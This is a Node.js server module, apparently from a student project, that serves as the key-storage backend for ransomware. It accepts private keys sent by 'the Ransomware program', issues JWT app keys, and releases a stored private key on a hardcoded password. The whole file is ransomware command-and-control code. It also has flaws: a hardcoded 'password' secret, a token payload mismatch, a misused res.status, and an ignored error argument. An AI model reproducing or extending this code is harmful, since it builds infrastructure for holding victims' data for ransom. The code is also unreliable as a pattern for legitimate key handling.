'use strict'

const Key = require('./schemas/key');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const crypto = require('crypto');
const config = JSON.parse(fs.readFileSync('/home/ubuntu/378Project/nodeServer/config/config.json', 'utf-8'));

const genToken = function(appKey) {
	return jwt.sign( {id: appKey}, config.secret);
};

const verifyKey = function(token, callback) {
	jwt.verify(token, config.secret, function(err, decoded) {
		if(err) {
			err = new Error('Unable to verify the application key');
			err.status = 500;
			return callback(err, null);
		}
		//Try to find a Key with the passed Appkey Value
		Key.findOne({"appKey": decoded.id}, function(err, key) {
			if(err || !key) {
				err = new Error('Application not found');
				err.status = 404;
				return callback(err, null);
			}
			return callback(null, key);
		});
	});
};

const verifyPassword = function(key, password, callback) {
	//Verify if the password is correct
	let serverPassword = "password"
	if(serverPassword.localeCompare(password) == 0) {
		//If the password is correct, return the private key in the callback
		return callback(null, key.privateKey);
	} else {
		let err = new Error('Password is wrong');
		err.status = 404;
		return callback(err, null);
	}
};

const storePrivGenAppkey = function(req, res) {
	//Now we need to save the Private Key object received from the Application
	if(req.body.privateKey) {
        	//Generate an app key to send to the Ransomware program
        	let genAppKey = crypto.randomBytes(20).toString('hex');
        	//Create the JWT token
        	let token = genToken({appKey: genAppKey});
		//Save the private key object along with the app key to the database
		let privateKeyObject = req.body.privateKey;
		let keyData = {
			appKey: genAppKey,
			privateKey: privateKeyObject
		};
		Key.create(keyData, function(err, key) {
			if(err) {
				res.status = 401;
				return res.json({message: err.message});
			} else {
				return res.json({'token': token});
			}
		})
	} else {
		//The application did not send a PrivateKey object
		let err = new Error('Application did not send a PrivateKey Object');
		err.status = 401;
		return res.json({message: err.message});
	}
};

const retrievePriv = function(req, res) {
	//Check if the request contains an appKey field
	if(req.get('appKey') && req.get('password')){
		//Retrieve values
		let password = req.get('password');
		let token = req.get('appKey');
		//Verify the application key
		verifyKey(token, function(err, key) {
			if(err) {
				err = new Error('Unable to verify application token');
				err.status = 401;
				return res.json({message: err.message});
			}
			//Verify the password now
			verifyPassword(key, password, function(err, privateKey){
				res.json({privateKey: privateKey});
			});
		});
	}else {
		let err = new Error('Application did not send either application key or the password or both');
		err.status = 401;
		return res.json({message: err.message});
	}
};

module.exports = {
	storePrivGenAppkey,
	retrievePriv
};
